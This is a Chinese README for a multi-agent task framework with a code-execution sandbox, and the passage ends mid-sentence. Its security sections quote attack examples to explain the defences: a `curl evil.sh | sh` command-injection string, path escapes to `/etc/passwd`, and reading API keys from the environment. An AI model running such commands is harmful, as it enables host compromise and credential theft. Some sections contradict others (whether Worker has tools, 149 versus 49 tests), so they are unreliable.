# AgentsTemplate

[![CI](https://github.com/ydh9851/agents-template/actions/workflows/ci.yml/badge.svg)](https://github.com/ydh9851/agents-template/actions/workflows/ci.yml)
![Python](https://img.shields.io/badge/python-3.11%2B-blue)
![License](https://img.shields.io/badge/license-MIT-green)

## 项目简介

一个轻量的多 Agent 任务执行框架：丢给它一个复杂任务，它自动完成「拆解 → 执行 → 验收 → 汇总」的闭环。

- **角色分工**：Manager 拆解 · Worker 执行（可读写文件、执行代码）· Coder / Tester 写实现与测试 · Checker 独立验收，不达标就带着意见打回重做
- **技术栈**：Python 3.11+ · LangGraph 状态机 · DeepSeek（OpenAI 兼容协议）· ChromaDB + BM25 混合检索（RRF 融合 + 可插拔重排）· FastAPI + SSE · SQLite checkpoint · 代码执行沙箱
- **开箱可跑**：无 API Key 自动进 Mock 模式，149 个 pytest 用例全部离线运行，CI 同时验证全量依赖与降级路径
- ⚠️ **安全提示**：默认沙箱（`subprocess`）是「资源受限的执行」，**不是隔离** ——
  被执行的代码与宿主同用户、能读文件系统、能联网。跑 Agent 自己写的代码够用；
  **要跑不可信输入，请设 `SANDBOX_BACKEND=docker`**。不需要代码执行就设 `CODE_EXECUTION_ENABLED=false`

> **准备继续开发？** 先读 [`docs/TARGET.md`](docs/TARGET.md) —— 它定义了项目的最终目标形态、逐条验收标准、分阶段实施路径与硬性约束。本文档说明「现在是什么样」，那份说明「要变成什么样」。

---

## 为什么需要它

把「写一份技术选型说明」这类复杂任务丢给大模型，它会一口气给你一段文本。问题是：**中间没有质检，写错的地方你只能自己发现。**

输出越长越容易出问题——漏掉要点、前后矛盾、答非所问。而这个过程中你无从干预，因为你看不到它在想什么、做到哪一步。

AgentsTemplate 的做法是**把「一次对话」拆成「一条流水线」**：

```
用户任务
   ↓
Manager   拆成子任务：描述 / 依赖 / 验收标准        ← 1 次模型调用
   ↓
Worker    按顺序执行，需要资料时调混合检索 RAG      ← N 次
   ↓
Checker   独立验收，不达标就打回重做                ← N 次
   ↓
Manager   汇总所有结果，输出最终交付物              ← 1 次
```

关键在于**执行者和验收者是分开的**。Worker 说「我做完了」不算数，Checker 会按事先定好的验收标准独立判断，不通过就带着意见打回重做。

> 没有质检的多步执行，只是把错误放大 N 倍。

## 核心特性

- **多 Agent 协作闭环** —— Manager / Worker / Checker 三角色分工，LangGraph 状态机编排，重试回环是图的一部分
- **依赖驱动调度** —— `deps` 真正参与调度：按就绪集选任务，同层并行执行，失败分支不拖累无关子任务
- **混合检索 RAG** —— BM25（关键词）+ 向量（语义）双路召回 → RRF 融合 → 可插拔重排，检索结果带来源标注
- **可插拔 Rerank** —— 零依赖启发式（默认）/ 交叉编码器 / LLM 打分三档，实测把 Hit@3 从 65% 拉到 80%
- **受控工具层** —— Worker 能读写工作区文件、把成品真正落盘；路径校验四道关，越界直接拒绝
- **Coder / Tester 双角色** —— Tester 独立出题（看不到实现），Coder 实现并跑到 pytest 真的变绿。
  验收依据从「LLM 自评」换成**真实退出码**，这是全项目唯一不由模型说了算的环节
- **代码执行沙箱** —— subprocess / docker 双后端；默认后端够跑 Agent 自己写的代码，
  不可信输入请切 docker（`--network=none` + 内存/CPU/PID 上限）
- **断点续跑** —— 每个节点执行完自动落盘 SQLite，进程崩了用同一个 `thread_id` 就能接着跑
- **SSE 流式输出** —— 节点级事件实时推送，能看到「Checker 打回了第 2 个子任务」
- **断线续传** —— 任务跑在后台线程，连接断了不中止；重连带 `Last-Event-ID` 从断点继续读
- **离线 Mock 模式** —— 没有 API Key 也能跑通全链路，开发与 CI 不需要真实额度
- **多级容错设计** —— 依赖缺失、外部服务异常、单点失败都有明确的降级或兜底路径
- **LLM 可靠性** —— 指数退避重试 + 总时间预算 + 多模型回退链，一次网络抖动不会让整个任务失败
- **成本可见、可控** —— 每次调用的 token 计入任务总量并随结果返回；配置预算后超限直接熔断
- **可观测性** —— `thread_id` 贯穿日志（可选 JSON 结构化输出），`/metrics` 暴露调用次数、耗时与 token
- **离线评估** —— 拆解质量 / 验收准确率 / 端到端完成率三套评估脚本，可卡阈值进 CI
- **可选鉴权与限流** —— 配 `API_KEYS` 即启用；滑动窗口限流默认关闭，保持开箱即用

## 它是怎么工作的

### LangGraph 图结构

```
manager ──> worker ──> checker ──┬── 还有未完成的子任务 ──> worker
   │                             │
   │                             └── 全部完成 ──> summarize ──> END
   │
   └── 没有拆出子任务 ─────────────────────────────> summarize ──> END
```

- `manager` 入口节点：读用户任务，输出结构化子任务列表（含 `deps` 依赖声明）
- `worker` 执行节点：向调度器要「当前就绪的一层子任务」，**并行执行**，需要时调 RAG
- `checker` 验收节点：逐个验收本批产出；通过则入库，不通过则打回（附理由），超限则标记失败
- `summarize` 出口节点：把所有结果汇总成最终交付物

整张图只有一条主线 + 一个重试回环，所以流程图能读完。是否继续循环由调度器决定：只要还有没做完的子任务就回 Worker。真正让它能跑起来的是「每个节点边界都是一个安全点」——这正是断点续跑的基础。

### 子任务调度：`deps` 真正参与决策

谁该执行**不看下标，只看依赖**：

```
ready(sub) = 所有依赖都已通过验收 且 自己还没完成
```

调度器（`graph/scheduler.py`）每轮算出整个就绪层，交给 Worker **并行执行** ——
两个互不依赖的子任务从「串行 2 轮」变成「并行 1 轮」（并发上限由 `MAX_PARALLEL_SUBTASKS` 控制）。

出边只有三种状态，覆盖全部情况：

| 状态 | 含义 | 下一步 |
| --- | --- | --- |
| `run` | 有就绪任务 | 交给 Worker 并行执行 |
| `blocked` | 还有没做完的，但一个都不就绪 | 说明被失败的依赖堵死了 → 一次性标记未通过，避免空转 |
| `idle` | 全部完成 | 去 summarize |

两个容易被忽略的收益：

- **失败不再拖垮无关分支**：t1 失败时，完全不依赖它的 t3 照样立刻执行（线性推进只能排队等）
- **依赖失败不再空转**：被堵住的子任务在调度阶段就被批量标记，不必各自走一遍 Worker → Checker

### 工具层：Worker 能真正落盘产物

Worker 原本只能「说」，不能「做」。现在它能调用三个白名单工具，把成品真正写进工作区：

| 工具 | 作用 |
| --- | --- |
| `list_files` | 看看工作区里已经有什么 |
| `read_file` | 读回之前的产物（跨子任务协作的基础） |
| `write_file` | 把报告、清单、方案写成文件 |

执行方式是标准的 ReAct 循环：模型选工具 → 执行 → 结果回灌 → 直到它给出最终答复，
最多 `MAX_TOOL_ROUNDS` 轮。轮次用尽时**不是判失败，而是摘掉工具再问一次**，让它基于已有信息收尾 ——
至少能拿到一份结论，而不是白跑一轮 token。

**安全边界（比功能本身更重要）**

开放文件权限之前，路径校验是唯一重要的事。`app/workspace.py` 的四道关：

1. 拒绝绝对路径 —— 否则 `/etc/passwd` 一步就走出去了
2. 拒绝 `..` 越界 —— `../../` 同样能出去
3. `resolve()` 之后**再校验目录归属** —— 这一步专治符号链接，前两道拦不住；
   顺带也挡住了 `workspace_evil/` 这种「同前缀但不同目录」的绕过
4. 限制后缀（只允许文本类）与文件大小

越界不是抛异常，而是作为**工具错误回灌给模型** —— 模型写错路径时，
正确的反应是告诉它「不允许」，而不是让整个任务崩掉。

> 一个实测踩到的坑：Worker 把内容写进文件后，正文里往往只剩「已保存到 xxx.md」，
> Checker 只看正文就会判**不通过**，任务无端变成 `partial`。
> 现在 Checker 的验收材料里会附上产物文件内容 —— 验收材料必须和交付物一致。

### 编码链路：让「做完了」由 pytest 说了算

前面所有环节的验收都是**软的** —— Checker 读一段文字，判断它合不合格。
这一环不一样：

```
Manager 标了 needs_code
        ↓
Tester 写测试（看不到实现）              ← 独立出题
        ↓
Coder 写实现 → run_tests → 看报错 → 改 → 再跑    ← 最多 6 轮
        ↓
pytest 退出码 = 0，才算做完              ← 硬的
```

**为什么 Tester 必须先于 Coder，而且看不到实现**

如果先有实现，测试会不自觉地照着实现的边界写 ——「实现怎么跑，测试就怎么测」，等于没测。
把两者拆成独立角色、并锁死顺序，是为了让测试真正成为一道独立关卡。

**实测效果**（一次真实运行，任务是「实现 `is_palindrome` 并写测试验证」）：

| 产物 | 内容 |
|---|---|
| `solution.py` | 1342 字节：类型校验 + 双指针实现 + 设计说明注释 |
| `tests/test_palindrome.py` | 3250 字节，**15 个用例**：正常路径 / 边界（空串、单字符、纯符号、纯空白、Unicode 中文）/ 异常输入（`None`、`int`、`list` 抛 `TypeError`） |

再用一个**独立于本框架的** pytest 进程复跑这些产物：15 个用例全部通过。

> 值得留意的是其中那条 `test_unicode_letters_are_kept`（中文回文「上海 海上」）——
> 没有任何人提示它要考虑中文，这是 Tester 自己找上门的边界。

**沙箱：默认后端不是隔离**

`app/sandbox.py` 提供两个后端，能力与代价都很明确：

| 后端 | 隔离强度 | 代价 |
|---|---|---|
| `subprocess`（默认） | ⚠️ **不是隔离**：与宿主同用户、能读文件系统、能联网 | 零依赖、开箱可用 |
| `docker` | 容器级：`--network=none`、内存/CPU/PID 上限、根文件系统只读 | 需要本机有可用的 Docker |

无论哪个后端，下面几条都是硬性的（也是这个模块真正值钱的地方）：

1. **清空环境变量** —— 只留 PATH / LANG 那几个。项目 `.env` 里放着 `DEEPSEEK_API_KEY`，
   不清理的话，一段 `import os; print(os.environ)` 就能读走再往外发。最容易漏、后果最重的一条
2. **超时杀整个进程组** —— 只 kill 主进程的话，它 fork 出来的子进程会活下来继续跑
3. **只执行工作区内的 `.py`** —— 解释器固定、参数单独传参、不经过 shell；
   否则 `python x.py; curl evil.sh | sh` 就能把前面所有路径校验绕过去
4. **输出只保留尾部** —— 报错信息在末尾，前面的多半是噪音；同时也防着一句 print 刷爆上下文

这些边界都有测试兜着（`tests/test_sandbox.py`，20 个用例）。
其中「密钥不泄漏」是用端到端方式验的：父进程设 `DEEPSEEK_API_KEY` → 子进程打印 `os.environ` → 断言读不到。

### 三个 Agent 的职责

| Agent | 做什么 | 不做什么 |
| --- | --- | --- |
| **Manager** | 拆解任务出 JSON；全部完成后汇总交付 | 不执行具体子任务 |
| **Worker** | 并行执行一层就绪子任务；按 `need_rag` 决定是否调检索 | **不自我验收**，也不碰依赖未满足的子任务 |
| **Checker** | 独立判断结果是否达标；写出具体的打回理由 | 不修改结果，只判定 |

### Worker 的能力边界（重要）

Worker 是纯语言模型，**没有任何工具**：不能访问文件系统、不能读代码仓库、不能执行命令、不能联网。

它唯一的外部信息通道是 RAG 资料库。因此 Manager 被硬性约束：

- 禁止拆出「扫描仓库 / 读取源码 / 给出真实文件路径或行号 / 运行代码验证」这类子任务
- 验收标准必须能在「不访问文件系统、不执行代码」的前提下判定

这条约束是实测踩坑后补上的：早期版本里 Manager 生成了「给出真实文件路径清单」「引用具体代码位置」这类验收标准，导致 5 个子任务各重试 3 次全部失败（约 30 次无效调用）。加上约束后，同一任务改为 1 个子任务、1 次通过（4 次调用）。

**这意味着本框架目前只适合「文本产出」类任务**，接不了编码任务。想让它真正动手改文件，需要先补工具层（见「路线图」）。

## 快速开始

### 本地启动

```bash
git clone https://github.com/ydh9851/agents-template.git
cd agents-template

python -m venv .venv
# Windows
.venv\Scripts\activate
# macOS / Linux
source .venv/bin/activate

pip install -r requirements.txt

# Windows
copy .env.example .env
# macOS / Linux
cp .env.example .env
# 编辑 .env 填入 DEEPSEEK_API_KEY（留空则自动进入 Mock 模式）

python tools/ingest.py          # 构建 RAG 索引
uvicorn main:app --port 8000
```

打开 http://localhost:8000/health 应看到：

```json
{
  "status": "ok",
  "mock_mode": false,
  "model": "deepseek-chat",
  "model_chain": ["deepseek-chat"],
  "auth_enabled": false,
  "rate_limit_per_minute": 0,
  "token_budget": 0,
  "index": { "backend": "chromadb", "documents": 51, "bm25_ready": true }
}
```

> 不启动服务也能用：`tools/run_task.py` 直接驱动状态机，只是少了 HTTP 那一层。

### Docker Compose

```bash
cp .env.example .env            # Windows: copy .env.example .env
docker compose up --build -d
docker compose logs -f agents-api
```

容器启动时会先执行 `python tools/ingest.py` 重建索引（幂等），再拉起服务；`./data` 已挂载为卷，checkpoint 与索引在容器重建后依然保留。

## 使用方式

### 命令行

```bash
# 跑一个任务，实时打印节点执行过程
python tools/run_task.py "说明本框架的 RRF 融合是怎么工作的"

# 断点续跑：先跑一次记下打印出的 thread_id，再用它恢复
python tools/run_task.py --thread-id <thread_id> --resume

# 完全离线跑（不消耗 API 额度）
MOCK_LLM=true python tools/run_task.py "测试任务"
```

### HTTP API

| 方法 | 路径 | 说明 |
| --- | --- | --- |
| GET | `/health` | 健康检查：模型、Mock 状态、向量库后端、索引规模 |
| POST | `/task` | 执行任务，阻塞返回最终状态 |
| POST | `/task/stream` | 执行任务，SSE 流式输出；带 `Last-Event-ID` 可断线续传 |
| GET | `/task/{thread_id}/state` | 查询某个 thread 的最新 checkpoint |
| POST | `/retrieve` | 混合检索调试 |
| POST | `/index/build` | 重建索引 |
| GET | `/index/stats` | 索引状态 |
| GET | `/metrics` | Prometheus 文本指标：LLM 调用次数 / 耗时 / token、任务状态分布 |
| GET | `/` | 服务信息 |

> `/`、`/health`、`/metrics` 不参与鉴权：探活与监控抓取应当匿名可读，否则每次探活都要配 Key。

交互式文档在 http://localhost:8000/docs （FastAPI 自动生成，可以直接在页面上调接口）。

```bash
curl -X POST http://localhost:8000/task \
  -H "Content-Type: application/json" \
  -d '{"task":"说明本框架的 RRF 融合是怎么工作的"}'
```

### SSE 流式输出

```bash
curl -N -X POST http://localhost:8000/task/stream \
  -H "Content-Type: application/json" \
  -d '{"task":"写一份技术选型说明"}'
```

事件序列：

| 事件 | 含义 | data |
| --- | --- | --- |
| `start` | 任务开始 | `thread_id`、`resume`、`task` |
| `node` | 某个节点执行完成 | `node`（节点名）、`update`（状态增量） |
| `done` | 全部结束 | 完整最终状态，附 `token_usage`（本次任务 token 总量）与 `elapsed_ms`（总耗时） |
| `error` | 执行异常 | `message` |

`node` 级事件让前端能画出实时执行流水：拆了几个子任务、正在做第几个、哪一条被打回了。

### 断线续传

每个 SSE 帧都带 `id:`（单调递增），任务本身跑在**后台线程**里 ——
连接只是事件的读者，断开不会让任务中止：

```bash
# 第一次连接：假设读到 id=3 时网络断了
curl -N -X POST http://localhost:8000/task/stream \
  -H "Content-Type: application/json" \
  -d '{"task":"写一份技术选型说明","thread_id":"demo-1"}'

# 重连：带上同一个 thread_id 和最后收到的 id，从 id=4 继续
curl -N -X POST http://localhost:8000/task/stream \
  -H "Content-Type: application/json" \
  -H "Last-Event-ID: 3" \
  -d '{"thread_id":"demo-1"}'
```

三条语义约定：

- **一个 `thread_id` 对应一次执行**：重连拿到的是同一个后台任务，不会重跑
- **`Last-Event-ID` 之前的帧不重放**，之后的照常推送（不重复、不缺失）
- 请求体里的 `task` 在重连时可以为空 —— 任务早就启动了，不必再传

> 浏览器原生 `EventSource` 重连时会自动带 `Last-Event-ID`；
> 本项目前端用 fetch 自读流（为了带 Token 和 POST），需要手动带这个头。
>
> 事件缓冲放在**进程内存**里（保留最近 50 次执行）。上 Redis 能做得更「生产」，
> 但那是另一个量级的复杂度；多副本部署时确实需要换成共享存储，见「已知限制」。

### 断点续跑

```bash
# 查询 checkpoint 状态：values 是完整状态，next 是接下来要执行的节点
curl http://localhost:8000/task/<thread_id>/state
```

任务用 `thread_id` 隔离，不同 thread 互不可见。进程重启后用同一个 `thread_id` + `resume=true` 即可从最后一个 checkpoint 继续。

## 配置

所有配置通过 `.env` 读取（pydantic-settings），代码中没有硬编码密钥。常用项：

| 变量 | 默认值 | 说明 |
| --- | --- | --- |
| `DEEPSEEK_API_KEY` | 空 | **留空即自动进入 Mock 模式** |
| `DEEPSEEK_BASE_URL` | `https://api.deepseek.com` | OpenAI 兼容地址 |
| `MODEL_NAME` | `deepseek-chat` | 也可换 `deepseek-reasoner` |
| `MAX_SUBTASKS` | `5` | 单次任务最多拆几个子任务 |
| `MAX_RETRY_PER_SUBTASK` | `2` | 单个子任务最多被打回几次 |
| `MAX_PARALLEL_SUBTASKS` | `3` | 同层就绪子任务的并行执行上限 |
| `RAG_TOP_K` | `3` | 注入 Prompt 的检索片段数 |
| `RRF_K` | `60` | RRF 平滑常数 |
| `RERANK_PROVIDER` | `heuristic` | `none` / `heuristic`（零依赖）/ `cross_encoder` / `llm` |
| `RERANK_POOL` | `10` | 送入重排的候选数（再从里面选出 `RAG_TOP_K` 条） |
| `WORKER_TOOLS` | `list_files,read_file,write_file,run_python,run_tests` | Worker 可用的工具；留空则退化为纯文本产出 |
| `MAX_TOOL_ROUNDS` | `3` | 单个子任务最多几轮工具调用（用尽后摘掉工具让它收尾） |
| `CODE_EXECUTION_ENABLED` | `true` | 关掉后摘除执行类工具，整体退化为「写文件 + 文本产出」 |
| `CODING_MAX_ROUNDS` / `TESTING_MAX_ROUNDS` | `6` / `2` | Coder 与 Tester 各自的工具轮次上限 |
| `SANDBOX_BACKEND` | `subprocess` | `subprocess`（零依赖，**不是隔离**）/ `docker`（容器隔离，推荐） |
| `SANDBOX_TIMEOUT` | `20` | 单次执行超时（秒）；超时杀掉**整个进程组**，不只是主进程 |
| `SANDBOX_DOCKER_IMAGE` / `SANDBOX_MAX_MEMORY_MB` | `python:3.11-slim` / `256` | docker 后端用的镜像与内存上限 |
| `WORKSPACE_DIR` | `data/workspace` | 工作区目录，所有文件读写都被限制在这里 |
| `ARTIFACT_MAX_KB` | `256` | 单个产物文件大小上限 |
| `RATE_LIMIT_BACKEND` | `memory` | `memory`（单进程）/ `redis`（多副本共享配额） |
| `CHUNK_SIZE` / `CHUNK_OVERLAP` | `500` / `80` | 文档切分粒度 |
| `EMBEDDING_PROVIDER` | `local` | `local`（零依赖哈希向量）/ `openai` |
| `SQLITE_PATH` | `data/checkpoint.sqlite` | checkpoint 位置 |
| `CORS_ORIGINS` | `*` | 生产环境请改成具体域名 |
| `MOCK_LLM` | `false` | 强制离线 Mock |
| `MOCK_CHECKER_FAIL_TIMES` | `0` | Mock 模式下让 Checker 前 N 次故意打回，用于验证重试分支 |
| `LLM_MAX_RETRIES` / `LLM_RETRY_BACKOFF` / `LLM_TOTAL_TIMEOUT` | `2` / `0.8` / `120` | 重试次数、退避基数（秒）、总时间预算（秒） |
| `FALLBACK_MODELS` | 空 | 主模型失败后依次尝试的备用模型（逗号分隔） |
| `TASK_TOKEN_BUDGET` | `0` | 单个任务的 token 预算，超出即拒绝继续调用（0 = 不限制） |
| `LOG_FORMAT` | `text` | `text` 人读友好 / `json` 一行一个 JSON，便于采集 |
| `API_KEYS` | 空 | 逗号分隔的合法 Key；**留空表示不鉴权** |
| `RATE_LIMIT_PER_MINUTE` | `0` | 每客户端每分钟请求上限（0 = 不限制） |
| `TRUST_PROXY` | `false` | 是否信任 `X-Forwarded-For`；直连时保持 false，否则限流能被伪造头绕过 |

完整清单见 [`.env.example`](.env.example)。

> 改了 `.env` 必须**重启服务**才生效——配置在进程启动时读取并缓存。

## 项目结构

```
agents-template/
├── main.py                     # FastAPI 入口（HTTP + SSE）
├── app/
│   ├── config.py               # 配置层：.env -> Settings
│   ├── llm.py                  # DeepSeek 接入 + 重试/回退/预算 + 离线 MockLLM
│   ├── observability.py        # 追踪上下文 + 结构化日志 + 指标
│   ├── security.py             # 可选鉴权 + 滑动窗口限流
│   ├── task_runner.py          # 后台执行 + 事件缓冲（SSE 断线续传的基础）
│   ├── sandbox.py              # 代码执行沙箱（环境清洗 / 超时杀进程组 / docker 可选）
│   ├── workspace.py            # 受控工作区：路径校验四道关
│   ├── tools.py                # 白名单工具：文件读写 + 代码执行
│   ├── prompts.py              # Prompt 模板加载
│   └── utils.py                # 日志、模板渲染、稳健 JSON 抽取
├── agents/                     # Agent 角色实现
│   ├── manager.py              #   拆任务 + 汇总
│   ├── worker.py               #   执行子任务 + 调 RAG + 分派编码链路
│   ├── coder.py                #   写实现，跑到测试真的变绿
│   ├── tester.py               #   独立写测试（看不到实现）
│   ├── loop.py                 #   ReAct 循环（Worker / Coder 共用）
│   └── checker.py              #   验收 + 重试控制
├── graph/
│   ├── state.py                # AgentState 状态定义
│   ├── scheduler.py            # 依赖驱动调度：就绪集计算（DAG）
│   └── workflow.py             # LangGraph 状态机 + 运行入口
├── rag/
│   ├── loader.py               # 文档加载与切分
│   ├── embedding.py            # Embedding 抽象（本地哈希 / OpenAI 兼容）
│   ├── store.py                # 向量库（ChromaDB / 本地 JSON 降级）
│   ├── hybrid_search.py        # BM25 + 向量 + RRF 融合
│   └── rerank.py               # 可插拔重排（heuristic / cross-encoder / LLM）
├── checkpoint/
│   └── sqlite_checkpoint.py    # LangGraph SQLite checkpoint
├── prompts/                    # 6 个 Prompt 模板（manager / worker / checker / summarizer / coder / tester）
├── tools/
│   ├── ingest.py               # 重建 RAG 索引
│   └── run_task.py             # 命令行跑任务
├── evals/                      # 离线评估：拆解质量 / 验收准确率 / 端到端
│   ├── run_eval.py             #   评估入口（--suite 选择套件 + 阈值退出码）
│   ├── metrics.py              #   指标：accuracy / P-R-F1 / 分位数
│   └── cases/                  #   评估用例（人工标注：拆解 / 验收 / 检索）
├── tests/                      # 回归测试（149 个用例，全部离线）
│   ├── test_smoke.py           #   核心算法 + 端到端链路
│   ├── test_scheduler.py       #   调度决策 / 同层并行 / 打回意见 / 验收材料
│   ├── test_task_runner.py     #   后台执行 / 事件缓冲 / 断线续传语义
│   ├── test_workspace.py       #   路径逃逸（绝对路径 / ../ / 符号链接 / 同前缀目录）
│   ├── test_tools.py           #   工具执行 / 越界回灌 / 白名单
│   ├── test_sandbox.py         #   沙箱：环境清洗 / 超时杀进程 / 输出截断 / pytest
│   ├── test_coding.py          #   编码链路：分派条件 / 产物合并与去重
│   ├── test_rerank.py          #   三档重排实现与降级路径
│   ├── test_observability.py   #   追踪上下文 / 日志格式 / 指标渲染
│   ├── test_security.py        #   鉴权开关 / 限流窗口 / Redis 降级
│   ├── test_llm_reliability.py #   重试 / 模型回退 / token 计量与预算
│   └── test_api.py             #   HTTP 契约（健康检查 / 指标 / 鉴权）
├── docs/TARGET.md              # 目标效果文档（最终目标 / 验收标准 / 实施路径）
├── data/docs/                  # RAG 语料（20 篇技术文档）
├── .github/workflows/ci.yml    # CI：全量依赖 + 降级路径双任务
├── requirements.txt / requirements-dev.txt
├── Dockerfile / docker-compose.yml
└── LICENSE
```

## 技术栈

| 层次 | 选型 |
| --- | --- |
| 运行时 | Python 3.11+（已在 3.12 验证） |
| 编排 | LangGraph 0.2.x（StateGraph + 条件边 + checkpointer） |
| 调度 | 自研 DAG 就绪集调度（`graph/scheduler.py`）+ 线程池同层并行 |
| 重排 | 可插拔：启发式（自研）/ CrossEncoder / LLM 打分，任一档故障自动降级 |
| 工具 | 白名单文件工具 + 受控工作区（路径校验四道关）+ ReAct 调用循环 |
| 沙箱 | subprocess（默认）/ Docker（`--network=none` + 内存与 PID 上限）|
| 代码任务 | Tester 独立出题 → Coder 实现 → pytest 真实验收 |
| LLM | DeepSeek API（OpenAI 兼容协议，经 `langchain-openai` 接入） |
| 关键词检索 | `rank_bm25`（BM25Okapi） |
| 向量库 | ChromaDB（0.5.x / 1.x 均可） |
| Embedding | 本地哈希向量（默认）/ OpenAI 兼容接口 |
| 融合算法 | RRF —— 自己实现，约 15 行 |
| 服务层 | FastAPI + Uvicorn + `sse-starlette` |
| 持久化 | SQLite（`langgraph-checkpoint-sqlite`） |
| 可观测性 | 自研轻量实现：contextvar 追踪上下文 + JSON 日志 + 手写 Prometheus 文本指标 |
| 安全 | 可选 API Key 鉴权 + 内存滑动窗口限流（走依赖注入，不干扰 SSE） |
| 评估 | 自研 `evals/`：规则打分 + 人工标注集 + 阈值退出码 |
| 部署 | Docker Compose |
| 测试 | pytest（49 用例，含 Mock 端到端）+ GitHub Actions |

## 设计要点

### 混合检索为什么用 RRF

RRF 的公式只有一行：

```
score(d) = Σ 1 / (k + rank_i(d))
```

其中 `rank_i(d)` 是文档 d 在第 i 路结果里的名次，`k` 默认 60。

它只用名次、不用分数，因此天然免疫量纲问题——BM25 的分数是无上界实数（可能 0.3，也可能 25），余弦相似度固定在 `[-1, 1]`，直接线性加权必须先归一化，而归一化方式的选择会显著影响排序，很难调。

中文检索上，BM25 用「单字 + 相邻双字」分词（`断点续跑` → `断点 / 点续 / 续跑`），这样即使用户只搜「续跑」也能命中。

### Embedding 的现实约束

**DeepSeek 官方没有 embedding 接口。** 所以默认使用 `EMBEDDING_PROVIDER=local`：用 hashing trick 把 token 投影到 384 维并做 L2 归一化。

它的优点是零依赖、零下载、确定性可复现；缺点是**本质上是字面匹配的量化版本，没有真正的语义泛化能力**。需要「同义不同词」的召回时，把 `EMBEDDING_PROVIDER=openai` 指向任意 OpenAI 兼容的 embeddings 服务，然后重建索引。

这是本项目 RAG 部分最大的能力边界。

### 容错降级

框架在 8 个地方做了明确的容错处理，保证「依赖缺失 / 外部服务异常 / 单点失败」不会让整条链路瘫痪：

| 场景 | 行为 |
| --- | --- |
| 没有 `DEEPSEEK_API_KEY` | 自动切换 `MockLLM`，状态机真实流转，输出为占位内容 |
| 未安装 chromadb | 降级为本地 JSON 向量库（numpy 余弦相似度），接口完全一致 |
| 未安装 `langchain-text-splitters` | 使用内置的等价切分实现 |
| 未安装 `langgraph-checkpoint-sqlite` | 降级为 `MemorySaver`，日志告警 |
| RAG 检索抛异常 | 记警告并返回空资料，任务继续（检索是增强项而非必需项） |
| Checker 调用失败 / 输出无法解析 | 自动放行并留痕，避免任务永久卡在验收环节 |
| 子任务连续不达标 | 达到 `MAX_RETRY_PER_SUBTASK` 后标记未通过并继续，最终 `status=partial` |
| 子任务的依赖未通过验收 | Worker 与 Checker 双双短路，**不调用模型**，直接标记未通过并继续 |

最后一条解决的是「一处失败拖垮整条依赖链」：没有它时，一个前置子任务失败会导致后续每个子任务各重试 3 轮，全部产出同样的「无法完成」，实测浪费 20 次以上调用。

## 测试

```bash
pip install -r requirements-dev.txt

pytest          # 149 个用例，约 7 秒
pytest -v       # 看每个用例名
```

全部用例**离线运行**（走 Mock 模式，不消耗 API 额度），覆盖：

| 层次 | 覆盖内容 |
| --- | --- |
| 工具函数 | JSON 抽取容错：代码块包裹 / 夹带解释 / 嵌套结构 / 完全不是 JSON |
| 子任务清洗 | id 去重、非法依赖过滤、脏数据丢弃、缺失验收标准补默认值 |
| RRF 融合 | 双路命中的文档排第一；只看名次，不受 BM25 无上界分数影响 |
| 检索组件 | 中文双字分词、哈希向量确定性与 L2 归一化、切分长度不越界 |
| 端到端 | 最小链路 `finished`、checkpoint 落盘可查回、打回重做后恢复、依赖失败短路 |
| 检索质量回归 | 问「RRF 倒数排名融合」必须能召回 `08-rrf.md` |
| 调度与并行 | 就绪集计算（等待 / 就绪 / 被堵住）、无关分支不被失败拖累、同层一轮跑完、打回意见真的回传 |
| 断线续传 | 事件 id 单调递增、读者断线期间任务照跑、重连不丢不重、登记表复用与淘汰、后台异常转事件 |
| 路径安全 | 绝对路径 / `../` 逃逸 / 符号链接逃逸 / 同前缀目录绕过 / 后缀与大小限制 |
| 工具层 | 执行成功、越界与未启用工具回灌为错误（不抛异常）、缺参数不崩 |
| 沙箱 | 父进程密钥不泄漏、超时真杀进程、输出截断保尾部、非 `.py` 与越界路径被拒 |
| 编码链路 | `needs_code` 三个前置条件、Mock 模式不走代码链路、测试文件计入产物且去重 |
| 重排 | 三档实现 + 两档降级（依赖缺失、模型失败）+ 工厂回退与实例缓存 |
| 可观测性 | 追踪上下文绑定与还原、JSON 日志字段、指标计数与渲染格式 |
| 鉴权 / 限流 | 开关边界（关了必须放行）、错误 Key 返回 401、滑动窗口超限 429 |
| LLM 可靠性 | 重试后成功、全部失败上抛、模型回退、token 累计、预算熔断 |
| HTTP 契约 | 健康检查与指标端点可用、鉴权在真实路由上生效 |

CI 有两个任务：`test` 跑全量依赖（Python 3.11 + 3.12）并执行 `manager` + `e2e` 两套评估，`degraded` **刻意不装 chromadb 和 langchain-text-splitters**，用来验证上表中那两条降级路径真的可用。

### 离线评估（evals/）

pytest 保证「功能不退化」，评估回答的是「输出好不好」。三个套件：

```bash
python evals/run_eval.py                       # 全部
python evals/run_eval.py --suite manager,e2e   # 只跑拆解与端到端
python evals/run_eval.py --min-manager 0.9     # 自定义阈值（不达标退出码非 0）
```

| 套件 | 评什么 | 指标 |
| --- | --- | --- |
| `manager` | 拆解结果是否符合预期 | 规则打分：结构合法性、依赖合法性、关键点覆盖、是否出现被禁的拆解方式 |
| `checker` | 验收判定与人工标注是否一致 | Accuracy / Precision / Recall / F1 + 混淆矩阵 |
| `retrieval` | 混合检索能否召回正确文档 | Hit@1 / Hit@3 / Hit@5 / MRR（20 条口语化标注，标注到文档级） |
| `e2e` | 完整链路的实际表现 | 完成率、平均与 P95 耗时、平均 token、平均重试次数 |

评估跑的是**线上同一套 Prompt 与清洗逻辑**（`split_task` / `build_checker_prompt` 从节点里抽出来复用）——
评估脚本自己另拼一份平行实现的话，分数再好看也代表不了线上行为。

零依赖本地哈希向量下的检索实测基线（CI 阈值按它留余量设定）：

| 重排策略 | Hit@1 | Hit@3 | Hit@5 | MRR |
| --- | --- | --- | --- | --- |
| `none`（不重排） | 45.0% | 65.0% | 75.0% | 0.545 |
| **`heuristic`（默认）** | **55.0%** | **80.0%** | **80.0%** | **0.667** |

> RRF 只回答「谁在两路里都排得靠前」，它**完全没看内容**；重排补的就是这一环。
> 开启默认的零依赖重排后 Hit@3 从 65% 提到 80%、MRR 从 0.545 提到 0.667 —— 且没有引入任何新依赖。
>
> 标注集刻意用口语化提问（例如「程序中途崩了任务还能接着跑吗」→ `10-checkpoint.md`），
> 不复述文档标题 —— 否则 BM25 那一路就能全中，测不出语义检索的贡献。
> 本地哈希向量本身没有语义能力，换真实 embedding 后这一项会明显提升。

> **`checker` 需要真实模型才有意义**：Mock 模式下 Checker 恒定放行，算出来的准确率是假的。
> 所以脚本在 Mock 模式会自动跳过该项的阈值判定，而不是给一个虚假的及格分；
